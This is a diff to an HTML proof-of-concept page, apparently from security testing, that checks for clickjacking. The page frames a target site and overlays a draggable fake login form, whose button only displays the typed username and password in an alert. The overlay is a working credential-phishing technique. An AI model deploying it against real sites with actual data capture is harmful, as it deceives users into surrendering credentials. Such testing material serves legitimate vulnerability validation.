@@ -6,8 +6,8 @@
 
 An example HTML page to validate clickjacking, which displays the target URL in an iframe 
 and overlays a logon form over it to demonstrate how the credentials could be harvested.
-The height and width of the overlay can be adjusted (line 40, below), and the login form 
-can then be dragged into position to get decent screenshots.
+The height and width of the overlay can be adjusted (line 50, below) and then, to get decent screenshots, the login form 
+can be moved into position by dragging the top border.
 
 Low risk (CVSS 2.9), as a link to this page would need to be fed to a user.
 
@@ -19,33 +19,49 @@ Low risk (CVSS 2.9), as a link to this page would need to be fed to a user.
       font-family: sans-serif;
     }
 
-    div {
-      position:absolute;
-      border: 6px double DarkKhaki;
-      z-index:2;
-      background-color: white;
-      padding: 15px;
+    #clickjacking {
+	  position:absolute; 
+	  background-color: white;
+	  z-index:3; 
+	  left: 40%; top: 40%; 
+	  border: 6px double DarkKhaki;
+	  border-top: 2px solid DarkKhaki;
+	  padding: 15px; padding-top: 0px;
     }
-
+	
+	#clickjackingheader {
+	  background-color: white;
+	  z-index:2; 
+	  border-bottom: 2px solid DarkKhaki;
+	  height: 4px;
+	}
 </style>
 
 </HEAD>
 <BODY>
+
 <!-- CHANGE THE TARGET URL AT THE BOTTOM OF THE PAGE -->
+
 <!-- 
 Adjust the WIDTH and HEIGHT of the login overlay here: 
 <!--== OVERLAY BEGINS HERE =============================================-->
-<div id="clickjacking" style= 'left: 40%; top: 40%;
+<div id="clickjacking" style= '
 
     width:230px; height:150px;
 
 '>
+	<div id="clickjackingheader"></div>
+	
+    <table>
+        <tr><td style="height: 5px;"></td></tr>
+		<tr><td>
 <!--======================================================================-->
 <!--  INPUT FIELD WIDTHS ARE CURRENTLY SET TO 99% OF THE PARENT ELEMENT   -->
 <!--======================================================================-->
 <!-- The label text and width of the USERNAME field can be adjusted here: -->
 <!--======================================================================-->
-                    Username <span style="color: Red">*</span><br>
+                    Username <span style="color: Red">*</span>
+					
                     <input name="Username" type="text" id="txtUserName" style="width: 99%;" />
 <!--===== NOTE: FIELD WIDTHS CAN ALSO BE FIXED, e.g. width: 200px; =======-->
 &nbsp;<br>
@@ -55,20 +71,22 @@ Adjust the WIDTH and HEIGHT of the login overlay here:
                     Password <span style="color: Red">*</span><br>
                     <input name="Password" type="password" id="txtPassword" style="width: 99%;" />
 <!--======================================================================-->
-    <table>
-        <tr>
-<!--============================================================================-->
-<!--Move the LOGIN button up or down by altering the height of the spacer here: -->
-<!--============================================================================-->
-            <td colspan="2" style="height: 30px"></td>
+            </td>
         </tr>
-        <tr>
+		<tr>
+<!--================================================================================-->
+<!--Move the LOGIN button up or down by altering the HEIGHT of the spacer row here: -->
+<!--================================================================================-->
+			<td colspan="2" style="height: 20px"></td>
+		</tr>
+		 <tr>
             <td>
                 <button width=450px type="button" onclick="maliciouscode(getElementById('txtUserName').value , getElementById('txtPassword').value)">&nbsp;&nbsp;Log in&nbsp;&nbsp;</button><br>&nbsp;
 
             </td>
         </tr>
     </table>
+	</div>
 <!--== OVERLAY ENDS HERE ===============================================-->
 </div> 
 
@@ -79,12 +97,11 @@ dragElement(document.getElementById("clickjacking"));
 function dragElement(elmnt) {
   var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
   if (document.getElementById(elmnt.id + "header")) {
-    /* if present, the header is where you move the DIV from: */
+    /* if present, the header is where you move the DIV from:*/
     document.getElementById(elmnt.id + "header").onmousedown = dragMouseDown;
   } else {
-    /* Move the login box from anywhere inside the DIV: */
+    /* otherwise, move the DIV from anywhere inside the DIV:*/
     elmnt.onmousedown = dragMouseDown;
-    //document.getElementById(elmnt.id).onmousedown = dragMouseDown;
   }
 
   function dragMouseDown(e) {
@@ -118,9 +135,9 @@ function dragElement(elmnt) {
   }
 
 }
-function maliciouscode(utxt, ptxt) {
+  function maliciouscode(utxt, ptxt) {
     alert("Clickjacking vulnerability.\n\nYou clicked the 'Log in' button! \nThis could harvest the user credentials and then run malicious code.\n\nUserName: " + utxt + "\nPassword:   " + ptxt);
-}
+  }
 </script>
 
 <center>
@@ -128,11 +145,11 @@ This page is<p>
 <font size=+3 color=red><B>VULNERABLE TO CLICKJACKING!</B></font><P>
 Click <a href=""><b>HERE</b></a> to be redirected to a page of my choice.<p>
 <B>An example form field has been overlaid in this page.<br>Clicking the button can run arbitrary code or collect credentials.</B><p>
-<script>alert("When the login overlay is displayed, drag it to the required position.\nWidth and height can be modified in the HTML page code."); </script>
+<script>alert("When the login overlay is displayed, drag it to the required position by clicking and dragging the top border.\nWidth and height can be modified in the HTML page code."); </script>
 
 <!-- change the target URL here:  -->
 <!--======================================================================--> 
-<iframe width=85% height=75% src="https://188.39.181.194"</iframe>
+<iframe width=85% height=75% src="https://ual.stagingadministrateapp.com"</iframe>
 <!--======================================================================-->
 
 </center>
